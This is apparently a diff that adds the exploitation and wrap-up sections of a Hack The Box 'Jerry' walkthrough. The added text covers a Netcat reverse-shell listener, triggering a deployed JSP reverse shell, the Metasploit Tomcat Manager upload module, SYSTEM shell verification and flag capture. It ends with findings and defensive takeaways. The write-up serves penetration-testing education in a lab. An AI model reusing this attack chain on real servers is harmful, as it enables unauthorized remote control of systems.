@@ -195,3 +195,224 @@ The presence of the deployed application confirmed that arbitrary code could now
 The final step was simply to trigger the JSP payload while listening for the incoming reverse shell.
 
 ---
+# Triggering the Payload
+
+Before executing the deployed application, a Netcat listener was started on the attacking machine to receive the incoming reverse connection.
+
+```bash
+nc -lvnp 4444
+```
+
+The deployed JSP payload was then accessed through the browser.
+
+```
+http://10.129.136.9:8080/revshell/revshell.jsp
+```
+
+Once the payload executed, the server initiated a reverse connection back to the listener.
+
+> 📷 **Screenshot**
+
+![Reverse Shell](Images/reverse_shell.png)
+
+An interactive Windows command shell was successfully obtained.
+
+---
+
+# Meterpreter Access
+
+To simplify post-exploitation, the deployment was also performed using Metasploit's Tomcat Manager upload module.
+
+The module authenticated to the Tomcat Manager, uploaded a malicious WAR application, executed it, and established a Meterpreter session.
+
+```text
+exploit/multi/http/tomcat_mgr_upload
+```
+
+> 📷 **Screenshot**
+
+![Tomcat Upload Module](Images/tomcat_mgr_upload.png)
+
+After execution, Meterpreter connected successfully.
+
+> 📷 **Screenshot**
+
+![Meterpreter Session](Images/meterpreter_session.png)
+
+This provided a more feature-rich shell for post-exploitation activities.
+
+---
+
+# Privilege Verification
+
+A shell was spawned from the Meterpreter session.
+
+```text
+meterpreter > shell
+```
+
+The current user context was verified.
+
+```cmd
+whoami
+```
+
+Output:
+
+```text
+nt authority\system
+```
+
+> 📷 **Screenshot**
+
+![SYSTEM Shell](Images/system_shell.png)
+
+The reverse shell was already executing with **NT AUTHORITY\SYSTEM**, meaning no privilege escalation was required.
+
+---
+
+# User Enumeration
+
+The local user directories were enumerated.
+
+```cmd
+cd C:\Users
+
+dir
+```
+
+> 📷 **Screenshot**
+
+![Users Directory](Images/users_directory.png)
+
+The Administrator profile was identified as the primary target.
+
+---
+
+# Administrator Desktop
+
+Navigating to the Administrator Desktop revealed a folder named **flags**.
+
+```cmd
+cd Administrator\Desktop
+dir
+```
+
+> 📷 **Screenshot**
+
+![Administrator Desktop](Images/admin_desktop.png)
+
+Unlike traditional Hack The Box machines, Jerry stores both flags inside this directory.
+
+---
+
+# Capturing the Flags
+
+Inside the **flags** directory, both the user and root flags were available.
+
+The objectives of the assessment were successfully completed.
+
+---
+
+# Findings
+
+| Finding | Severity |
+|----------|----------|
+| Exposed Apache Tomcat Manager Interface | High |
+| Administrative Credentials Allowed Manager Access | Critical |
+| Arbitrary WAR Deployment | Critical |
+| Remote Code Execution | Critical |
+| SYSTEM Privilege Obtained | Critical |
+
+---
+
+# Attack Summary
+
+```
+Nmap Enumeration
+        │
+        ▼
+Apache Tomcat 7.0.88
+        │
+        ▼
+Tomcat Manager Interface
+        │
+        ▼
+Valid Credentials
+        │
+        ▼
+Generate JSP Reverse Shell
+        │
+        ▼
+Package as WAR
+        │
+        ▼
+Deploy via Manager
+        │
+        ▼
+Execute JSP
+        │
+        ▼
+Reverse Shell
+        │
+        ▼
+NT AUTHORITY\SYSTEM
+        │
+        ▼
+Capture User & Root Flags
+```
+
+---
+
+# Skills Practiced
+
+- Network Enumeration
+- Service Fingerprinting
+- Apache Tomcat Enumeration
+- Web Application Administration Abuse
+- Java WAR Payload Generation
+- JSP Reverse Shell Deployment
+- Reverse Shell Handling
+- Meterpreter Usage
+- Windows Post-Exploitation
+- Windows File System Enumeration
+
+---
+
+# Tools Used
+
+- Nmap
+- Firefox
+- Apache Tomcat Manager
+- revshells.com
+- Java (`jar`)
+- Netcat
+- Metasploit Framework
+- Meterpreter
+
+---
+
+# Key Takeaways
+
+- Administrative interfaces should never be exposed without strong authentication.
+- Default or weak credentials remain one of the most common causes of compromise.
+- WAR deployment provides legitimate remote code execution functionality when administrative access is obtained.
+- Not every compromise requires exploiting a software vulnerability—misconfiguration and credential exposure can be equally severe.
+- Always enumerate available management interfaces during web application assessments.
+
+---
+
+# References
+
+- Apache Tomcat Documentation
+- OWASP Web Security Testing Guide
+- Metasploit Framework
+- Hack The Box
+
+---
+
+# Disclaimer
+
+This walkthrough is intended for educational purposes only. All testing was performed in an authorized Hack The Box laboratory environment.
+
+
